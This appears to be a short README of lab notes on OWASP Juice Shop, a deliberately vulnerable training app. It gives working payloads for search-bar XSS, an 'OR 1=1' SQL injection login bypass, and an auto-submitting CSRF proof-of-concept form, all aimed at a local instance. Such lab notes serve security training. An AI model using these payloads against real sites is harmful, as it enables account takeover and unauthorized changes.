# OWASP_JuiceShop


## List of Vulnerabilities

1. Check all the input parameters. (Just Trying on the website directly without any tool or crawling).

1.1 XSS in Search Bar
```
Payload: <img src=x onerror=alert("XSS")>
```

1.2 SQL Injection on login Page
```
Username: admin' OR 1=1;--
Password: anything
```

1.3 CSRF on Profile Page
```
# CSRF PoC

<html> <body> <form action="http://127.0.0.11:3000/profile" method="POST"> <input type="hidden" name="username" value="hacked" /> </form> <script> document.forms[0].submit(); history.pushState('', '', '/'); </script> </body> </html>|
```

